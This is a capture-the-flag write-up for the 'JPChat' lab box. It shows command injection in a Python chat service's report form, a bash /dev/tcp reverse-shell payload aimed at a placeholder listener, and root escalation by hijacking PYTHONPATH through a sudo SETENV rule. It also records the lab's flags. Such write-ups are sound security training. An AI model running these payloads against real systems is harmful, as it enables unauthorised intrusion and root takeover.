# JPChat CTF Writeup

## Target Information
- **IP Address**: 10.49.167.115
- **Operating System**: Linux (Ubuntu Xenial)
- **Services**:
    - SSH (Port 22)
    - JPChat (Port 3000)

## Enumeration

### Port Scanning
An initial Nmap scan revealed two open ports:
- **Port 22 (SSH)**: OpenSSH 7.2p2
- **Port 3000 (Custom Service)**: A banner identified it as "JPChat" and provided a hint about its source code being on the admin's GitHub.

### Source Code Analysis
Searching for "JPChat admin github" led to the repository `https://github.com/Mozzie-jpg/JPChat`. The core logic of the service is in `jpchat.py`:

```python
def report_form():
    print ('this report will be read by Mozzie-jpg')
    your_name = input('your name:\n')
    report_text = input('your report:\n')
    os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
    os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

The `report_form` function uses `os.system` with string formatting (`%s`), which is highly vulnerable to command injection. Since the input is wrapped in single quotes within a `bash -c` command, an attacker can break out of the quotes and execute arbitrary commands.

## Initial Access

### Command Injection Exploitation
By connecting to the service on port 3000 and initiating a report, I injected a reverse shell payload into the `your_name` field:

**Payload**: `test' ; bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" ; #`

Execution flow:
1. Connect to port 3000: `nc 10.49.167.115 3000`
2. Enter `[REPORT]` to trigger the form.
3. Provide the payload in the `your name` prompt.
4. Catch the reverse shell as user `wes`.

### User Flag
After gaining access, the user flag was found in the home directory:
- **Location**: `/home/wes/user.txt`
- **Flag**: `JPC{487030410a543503cbb59ece16178318}`

## Privilege Escalation

### Sudo Permissions
Checking sudo privileges with `sudo -l` revealed the following entry:
```text
(root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
User `wes` can run a specific Python script as root. Crucially, the `SETENV` tag allows the user to preserve environment variables, such as `PYTHONPATH`.

### Python Library Hijacking
The script `/opt/development/test_module.py` contains:
```python
from compare import *
print(compare.Str('hello', 'hello', 'hello'))
```
It attempts to import a module named `compare`. I exploited this by creating a malicious `compare.py` in the `/tmp` directory:

```python
import os
os.system("cat /root/root.txt")

class compare:
    @staticmethod
    def Str(a, b, c):
        return "pwned"
```

Then, I ran the sudo command while pointing `PYTHONPATH` to `/tmp`:
`sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py`

This forced Python to load my malicious `compare.py` from `/tmp` instead of any legitimate module, executing the `os.system` call as root.

### Root Flag
The root flag was successfully exfiltrated:
- **Location**: `/root/root.txt`
- **Flag**: `JPC{665b7f2e59cf44763e5a7f070b081b0a}`

## Summary of Flags
- **User Flag**: `JPC{487030410a543503cbb59ece16178318}`
- **Root Flag**: `JPC{665b7f2e59cf44763e5a7f070b081b0a}`
